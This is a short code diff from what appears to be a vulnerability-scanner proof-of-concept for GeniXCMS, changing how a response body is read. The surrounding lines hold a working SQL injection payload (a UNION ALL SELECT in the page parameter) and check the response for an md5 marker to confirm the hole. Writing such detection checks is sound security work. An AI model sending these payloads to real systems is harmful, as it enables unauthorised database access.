@@ -49,7 +49,7 @@ class Poc(ABPoc):
             url = self.target
             payload = "/genixcms/index.php?page=1' UNION ALL SELECT 1,2,md5('bb2'),4,5,6,7,8,9,10 and 'j'='j"
             verify_url = url + payload
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
